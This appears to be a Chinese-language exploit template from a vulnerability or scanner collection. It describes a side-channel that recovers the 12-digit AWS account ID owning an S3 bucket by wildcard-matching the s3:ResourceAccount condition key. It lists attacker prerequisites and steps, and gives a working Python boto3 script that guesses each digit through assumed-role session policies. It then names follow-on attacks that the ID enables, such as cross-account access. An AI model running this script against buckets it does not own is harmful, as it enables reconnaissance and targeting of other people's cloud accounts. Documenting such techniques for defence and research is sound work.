---
id: S3-ACCOUNT-ID-ENUM
title: S3 Bucket Account ID 侧信道枚举 (s3:ResourceAccount)
product: aws-s3
vendor: Amazon
severity: MEDIUM
tags: [information-disclosure, side-channel, s3, aws, 无需目标凭据]
fingerprint: ["s3.amazonaws.com", "AmazonS3", "x-amz-"]
---

## 漏洞描述

AWS S3 Bucket 的所属 Account ID（12 位）可通过 `s3:ResourceAccount` 条件键进行侧信道枚举。攻击者使用自己的 AWS 账户创建 IAM Role + Session Policy，利用 `StringLike` 通配符逐位猜测目标 Bucket 所属 Account ID。成功匹配返回正常响应（NoSuchKey/200），不匹配返回 AccessDenied。

## 前置条件

- 攻击者拥有任意 AWS 账户（可以是 Free Tier）
- 知道目标 S3 Bucket 名称
- 目标 Bucket 中至少有一个已知 Key（如 index.html）

## 利用步骤

1. 在攻击者账户创建 IAM User + Role（附加 AmazonS3ReadOnlyAccess）
2. 循环 12 位，每位尝试 0-9，构造 `s3:ResourceAccount: "XY??????????"` 条件
3. 使用 STS AssumeRole 附加 Session Policy 后尝试 s3:GetObject
4. AccessDenied = 数字错误，NoSuchKey/Success = 数字正确
5. 约 60 次 API 调用即可获得完整 12 位 Account ID

## Payload

```python
import boto3, json

BUCKET = "target-bucket"
KNOWN_KEY = "index.html"
role_arn = "arn:aws:iam::YOUR_ACCOUNT:role/enum-role"
sts = boto3.client('sts', region_name='us-east-1')

account_id = ""
for pos in range(12):
    for digit in range(10):
        pattern = account_id + str(digit) + "?" * (11 - pos)
        policy = json.dumps({"Version": "2012-10-17", "Statement": [{
            "Effect": "Allow", "Action": "s3:GetObject",
            "Resource": f"arn:aws:s3:::{BUCKET}/*",
            "Condition": {"StringLike": {"s3:ResourceAccount": [pattern]}}
        }]})
        try:
            c = sts.assume_role(RoleArn=role_arn, RoleSessionName=f"e{pos}{digit}",
                Policy=policy, DurationSeconds=900)['Credentials']
            s3 = boto3.client('s3', region_name='us-east-1',
                aws_access_key_id=c['AccessKeyId'],
                aws_secret_access_key=c['SecretAccessKey'],
                aws_session_token=c['SessionToken'])
            s3.get_object(Bucket=BUCKET, Key=KNOWN_KEY)
            account_id += str(digit); break
        except Exception as e:
            if 'NoSuchKey' in str(e):
                account_id += str(digit); break
            if 'AccessDenied' in str(e):
                continue

print(f"Account ID: {account_id}")
```

## 验证方法

获得 12 位 Account ID 后可用于构造完整 ARN、跨账户访问、Lambda 直接调用等后续攻击。

## 参考

- https://cloudar.be/awsblog/finding-the-account-id-of-any-public-s3-bucket/
